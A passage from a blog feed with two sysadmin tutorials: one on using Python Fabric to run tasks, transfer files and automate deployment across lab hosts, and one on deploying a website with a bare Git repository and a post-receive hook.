</span><span class='line'><span class="k">def</span> <span class="nf">remote_info</span><span class="p">():</span>
</span><span class='line'>        <span class="n">run</span><span class="p">(</span><span class="s">&#39;uptime&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Run commands on multiple hosts</h3>

<p>If you want to run a command on a host, and a different command on another host, you can do so by specifying which host you want to run a command on:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;root&#39;</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">key_filename</span> <span class="o">=</span> <span class="s">&#39;~/mykey.pem&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">local_info</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;This runs only on the localhost&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@hosts</span><span class="p">(</span><span class="s">&#39;192.168.216.128&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">remote_info</span><span class="p">():</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;This runs only on the remote host&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is how it would look like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab local_info remote_info
</span><span class='line'>This runs only on the localhost
</span><span class='line'>[192.168.216.128] Executing task 'remote_info'
</span><span class='line'>This runs only on the remote host
</span><span class='line'>
</span><span class='line'>Done.</span></code></pre></td></tr></table></div></figure>


<h3>Download / upload files</h3>

<p>Fabric also has built-in functionality for downloading and uploading files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
</span><span class='line'>        <span class="n">get</span><span class="p">(</span><span class="s">&#39;~/Desktop/ssh.sh&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Result:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab download
</span><span class='line'>[192.168.23.128] Executing task 'download'
</span><span class='line'>[192.168.23.128] download: path/192.168.23.128/ssh.sh &lt;- /root/Desktop/ssh.sh
</span><span class='line'>
</span><span class='line'>Done.
</span><span class='line'>Disconnecting from 192.168.23.128... done.</span></code></pre></td></tr></table></div></figure>


<p>And the upload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
</span><span class='line'>        <span class="n">put</span><span class="p">(</span><span class="s">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s">&#39;~/Desktop&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab upload
</span><span class='line'>[192.168.23.128] Executing task 'upload'
</span><span class='line'>[192.168.23.128] put: file.txt -&gt; /root/Desktop/file.txt
</span><span class='line'>
</span><span class='line'>Done.
</span><span class='line'>Disconnecting from 192.168.23.128... done.</span></code></pre></td></tr></table></div></figure>


<h3>Run sudo commands</h3>

<p>We saw some examples of using the root user, but Fabric allows running sudo commands from users with lower privileges:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;192.168.217.131&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;nixhat&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">cfg_test</span><span class="p">():</span>
</span><span class='line'>        <span class="n">sudo</span><span class="p">(</span><span class="s">&#39;apachectl configtest&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here it is in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab cfg_test
</span><span class='line'>[192.168.217.131] Executing task 'cfg_test'
</span><span class='line'>[192.168.217.131] sudo: apachectl configtest
</span><span class='line'>[192.168.217.131] Login password for 'nixhat':
</span><span class='line'>[192.168.217.131] out: sudo password:
</span><span class='line'>[192.168.217.131] out: AH00558: httpd: Could not reliably determine the server's
</span><span class='line'> fully qualified domain name, using localhost.localdomain. Set the 'ServerName'
</span><span class='line'>directive globally to suppress this message
</span><span class='line'>[192.168.217.131] out: Syntax OK
</span><span class='line'>[192.168.217.131] out:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Done.
</span><span class='line'>Disconnecting from 192.168.217.131... done.</span></code></pre></td></tr></table></div></figure>


<h3>Specifying multiple hosts with different users and passwords</h3>

<p>In case you have many hosts that you would like to run commands on as different users, you can do so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;root@192.168.217.130&#39;</span><span class="p">,</span> <span class="s">&#39;nixhat@192.168.216.128&#39;</span><span class="p">]</span> <span class="c"># hosts to run cmds on</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">passwords</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;root@192.168.217.130&#39;</span><span class="p">:</span><span class="s">&#39;password1&#39;</span><span class="p">,</span> <span class="s">&#39;nixhat@192.168.216.128&#39;</span><span class="p">:</span><span class="s">&#39;password2&#39;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Running tasks on predefined hosts</h3>

<p>If you have tasks that you want to run on certain hosts only, you can specify that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nd">@hosts</span><span class="p">(</span><span class="s">&#39;host1&#39;</span><span class="p">,</span> <span class="s">&#39;host2&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">mytask</span><span class="p">():</span>
</span><span class='line'>    <span class="n">run</span><span class="p">(</span><span class="s">&#39;cmd&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Classifying hosts into roles</h3>

<p>In a large environment, you are most likely to have many hosts that fulfill some roles, such as development machines and production servers. You can organize them in the Fabric code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">roledefs</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="s">&#39;production&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;prod1&#39;</span><span class="p">,</span> <span class="s">&#39;prod2&#39;</span><span class="p">],</span>
</span><span class='line'>    <span class="s">&#39;development&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;dev1&#39;</span><span class="p">,</span> <span class="s">&#39;dev2&#39;</span><span class="p">]</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Automating code deployment</h3>

<p>In a <a href="https://chousensha.github.io/blog/2017/03/30/using-git-for-code-deployment/">previous post</a>, we used Git for updating the code on a live server from a development machine. This time, we&rsquo;ll use Fabric to automate the process!</p>

<p>Besides the development and production servers we had before, we&rsquo;ll use a third computer to run the Fabric commands from. Let&rsquo;s assume this is your sysadmin machine, from which magic happens on the network. The developers made some changes to the code on the dev server, and you want to push them to production:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="c"># script must be called fabfile.py</span>
</span><span class='line'><span class="c"># fab -l - list available cmds</span>
</span><span class='line'><span class="c"># fab CMDNAME - run cmd</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the env dictionary allows for setting different variables for customizing the configuration</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">colorize_errors</span> <span class="o">=</span> <span class="s">&#39;true&#39;</span> <span class="c"># color errors in red and warnings in magenta</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">roledefs</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="s">&#39;dev&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;root@192.168.217.130:22 &#39;</span><span class="p">],</span>
</span><span class='line'>    <span class="s">&#39;prod&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;root@192.168.217.131:22&#39;</span><span class="p">],</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">passwords</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;root@192.168.217.130:22&#39;</span><span class="p">:</span><span class="s">&#39;5t0rm80rn&#39;</span><span class="p">,</span> <span class="s">&#39;root@192.168.217.131:22&#39;</span><span class="p">:</span><span class="s">&#39;hakubo10&#39;</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nd">@roles</span><span class="p">(</span><span class="s">&#39;dev&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">prep</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Stage and commit new and modified files</span>
</span><span class='line'><span class="sd">    :return:</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">with</span> <span class="n">settings</span><span class="p">(</span><span class="n">warn_only</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span> <span class="c"># continue executing even if errors were encountered</span>
</span><span class='line'>        <span class="k">with</span> <span class="n">cd</span><span class="p">(</span><span class="s">&#39;/root/Testing/Dev&#39;</span><span class="p">):</span>
</span><span class='line'>            <span class="n">run</span><span class="p">(</span><span class="s">&#39;git add . &amp;&amp; git commit -m &quot;Add changes&quot;&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@roles</span><span class="p">(</span><span class="s">&#39;dev&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">push</span><span class="p">():</span>
</span><span class='line'>    <span class="k">with</span> <span class="n">cd</span><span class="p">(</span><span class="s">&#39;/root/Testing/Dev&#39;</span><span class="p">):</span>
</span><span class='line'>        <span class="n">run</span><span class="p">(</span><span class="s">&#39;git push production&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@roles</span><span class="p">(</span><span class="s">&#39;prod&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">chk</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Confirm that files have been updated on the web server</span>
</span><span class='line'><span class="sd">    :return:</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">run</span><span class="p">(</span><span class="s">&#39;ls /var/www/html/myweb/site&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now list the available commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab -l
</span><span class='line'>Available commands:
</span><span class='line'>
</span><span class='line'>    chk   Confirm that files have been updated on the web server
</span><span class='line'>    prep  Stage and commit new and modified files
</span><span class='line'>    push</span></code></pre></td></tr></table></div></figure>


<p>And run them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab prep push chk
</span><span class='line'>[root@192.168.217.130:22] Executing task 'prep'
</span><span class='line'>[root@192.168.217.130:22] run: git add . && git commit -m "Add changes"
</span><span class='line'>[root@192.168.217.130:22] out: [master 5719a02] Add changes
</span><span class='line'>[root@192.168.217.130:22] out:  1 file changed, 1 insertion(+), 1 deletion(-)
</span><span class='line'>[root@192.168.217.130:22] out:
</span><span class='line'>
</span><span class='line'>[root@192.168.217.130:22] Executing task 'push'
</span><span class='line'>[root@192.168.217.130:22] run: git push production
</span><span class='line'>[root@192.168.217.130:22] out: root@192.168.217.131's password:
</span><span class='line'>[root@192.168.217.130:22] out: Counting objects: 3, done.
</span><span class='line'>[root@192.168.217.130:22] out: Compressing objects:  33% (1/3)
</span><span class='line'>[root@192.168.217.130:22] out: Compressing objects:  66% (2/3)
</span><span class='line'>[root@192.168.217.130:22] out: Compressing objects: 100% (3/3)
</span><span class='line'>[root@192.168.217.130:22] out: Compressing objects: 100% (3/3), done.
</span><span class='line'>[root@192.168.217.130:22] out: Writing objects:  33% (1/3)
</span><span class='line'>[root@192.168.217.130:22] out: Writing objects:  66% (2/3)
</span><span class='line'>[root@192.168.217.130:22] out: Writing objects: 100% (3/3)
</span><span class='line'>[root@192.168.217.130:22] out: Writing objects: 100% (3/3), 294 bytes | 0 bytes/
</span><span class='line'>s, done.
</span><span class='line'>[root@192.168.217.130:22] out: Total 3 (delta 2), reused 0 (delta 0)
</span><span class='line'>[root@192.168.217.130:22] out: To 192.168.217.131:Prod
</span><span class='line'>[root@192.168.217.130:22] out:    39e598d..5719a02  master -&gt; master
</span><span class='line'>[root@192.168.217.130:22] out:
</span><span class='line'>
</span><span class='line'>[root@192.168.217.131:22] Executing task 'chk'
</span><span class='line'>[root@192.168.217.131:22] run: ls /var/www/html/myweb/site
</span><span class='line'>[root@192.168.217.131:22] out: index.html  new.html  updates.html
</span><span class='line'>[root@192.168.217.131:22] out:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Done.
</span><span class='line'>Disconnecting from root@192.168.217.130... done.
</span><span class='line'>Disconnecting from root@192.168.217.131... done.</span></code></pre></td></tr></table></div></figure>


<p>In a file with many tasks, it will get tiresome to always specify them on the command line. You can organize your code to have a function that calls other tasks, respecting the roles and settings for each. Add this to the previous code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">deploy</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Execute previous tasks by taking into account the defined roles </span>
</span><span class='line'><span class="sd">    :return:</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">execute</span><span class="p">(</span><span class="n">prep</span><span class="p">)</span> <span class="c"># on dev</span>
</span><span class='line'>    <span class="n">execute</span> <span class="p">(</span><span class="n">push</span><span class="p">)</span> <span class="c"># on dev</span>
</span><span class='line'>    <span class="n">execute</span><span class="p">(</span><span class="n">chk</span><span class="p">)</span> <span class="c"># on prod</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now you can run only <code>fab deploy</code> to get the same results!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ In the stairway of life, you'd best \
</span><span class='line'>\ take the elevator.                  /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Git for code deployment]]></title>
    <link href="http://chousensha.github.io/blog/2017/03/30/using-git-for-code-deployment/"/>
    <updated>2017-03-30T07:09:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/03/30/using-git-for-code-deployment</id>
    <content type="html"><![CDATA[<p>Imagine you have a local server where you work on developing the code for a web application. After doing your magic, you want to upload it to the web server so the rest of the world can access your shiny new web app. To do that, you have to place your code on another server, which serves as the production environment. Moreover, when making changes to your code, you only want to update the modified files, not everything.</p>

<!-- more -->


<p>You could keep track of what files have been changed on your dev server, and then manually transfer them to the web server in production. Now that we have established how much time and sanity you would lose, especially with a big app, let&rsquo;s see how Git can make this kind of code deployment not only possible, but also smooth and efficient.</p>

<p>I will be using the root account for this demo, which is of course a bad idea in a live environment, so keep that in mind =D</p>

<p>On the server side, say we have a folder named Prod. Here we will push the code for a website, and then we&rsquo;ll transfer it to the web directory.</p>

<p>First, initialize a bare repository inside the Prod folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git init --bare
</span><span class='line'>Initialized empty Git repository in /root/Prod/</span></code></pre></td></tr></table></div></figure>


<p>For better security, we&rsquo;ll keep the git repository outside the web root directory. To automatically update the code, we&rsquo;ll use a git hook, which is a script that runs when a certain event occurs. In this case, we&rsquo;ll create a <code>post-receive</code> hook, which runs on a remote repository after a git push</p>

<p>In the hooks directory, I created a hook called post-receive, with the following code in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/sh
</span><span class='line'>GIT_WORK_TREE=/var/www/html/myweb/site git checkout -f # path to the web root, it has to be created beforehand</span></code></pre></td></tr></table></div></figure>


<p>Looking inside the hooks directory, you will see the samples are executable. We also have to make ours executable, so use <code>chmod +x</code></p>

<p>With that, the production server setup is complete. On the local development server, make a repository and add some files that you want to end up in production:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Testing/Dev#git add .
</span><span class='line'>root@pwnbox:~/Testing/Dev#git status
</span><span class='line'>On branch master
</span><span class='line'>
</span><span class='line'>Initial commit
</span><span class='line'>
</span><span class='line'>Changes to be committed:
</span><span class='line'>  (use "git rm --cached &lt;file&gt;..." to unstage)
</span><span class='line'>
</span><span class='line'>  new file:   index.html
</span><span class='line'>  new file:   updates.html
</span></code></pre></td></tr></table></div></figure>


<p>Now add a remote, which will point to the production repository:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git remote add production root@192.168.217.131:Prod</span></code></pre></td></tr></table></div></figure>


<p>Make a commit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git commit -m '1st commit'
</span><span class='line'>[master (root-commit) bac80ea] 1st commit
</span><span class='line'> 2 files changed, 2 insertions(+)
</span><span class='line'> create mode 100644 index.html
</span><span class='line'> create mode 100644 updates.html</span></code></pre></td></tr></table></div></figure>


<p>And now push the changes to production &mdash; note the use of the <a href="https://www.git-scm.com/book/tr/v2/Git-Internals-The-Refspec">refspec</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git push production +master:refs/heads/master
</span><span class='line'>root@192.168.217.131's password: 
</span><span class='line'>Counting objects: 4, done.
</span><span class='line'>Compressing objects: 100% (2/2), done.
</span><span class='line'>Writing objects: 100% (4/4), 331 bytes | 0 bytes/s, done.
</span><span class='line'>Total 4 (delta 0), reused 0 (delta 0)
</span><span class='line'>To 192.168.217.131:Prod
</span><span class='line'> * [new branch]      master -&gt; master</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see if it worked! On my production server:</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/git1.png" title="Code updated" alt="Code was pushed to web server"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/git2.png" title="Code updated" alt="Code was pushed to web server"></p>

<p>It did work! Now let&rsquo;s update a file, and only push this file which has been modified. After making the modifications, look at the current status:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git status
</span><span class='line'>On branch master
</span><span class='line'>Changes not staged for commit:
</span><span class='line'>  (use "git add &lt;file&gt;..." to update what will be committed)
</span><span class='line'>  (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)
</span><span class='line'>
</span><span class='line'>  modified:   updates.html
</span><span class='line'>
</span><span class='line'>no changes added to commit (use "git add" and/or "git commit -a")</span></code></pre></td></tr></table></div></figure>


<p>Commit the modified file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git commit -a -m 'Update to 1 file'</span></code></pre></td></tr></table></div></figure>


<p>And now push to production and also set the remote branch so next time you can do it with a simple <code>git push production</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git push --set-upstream production master
</span><span class='line'>root@192.168.217.131's password: 
</span><span class='line'>Counting objects: 3, done.
</span><span class='line'>Compressing objects: 100% (3/3), done.
</span><span class='line'>Writing objects: 100% (3/3), 345 bytes | 0 bytes/s, done.
</span><span class='line'>Total 3 (delta 0), reused 0 (delta 0)
</span><span class='line'>To 192.168.217.131:Prod
</span><span class='line'>   bac80ea..6fcdb86  master -&gt; master
</span><span class='line'>Branch master set up to track remote branch master from production.</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/git3.png" title="Changed file uploaded" alt="The modified file was successfully updated"></p>

<p>And to confirm that on the production environment, only the modified file was updated, but the unchanged one remained the same:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
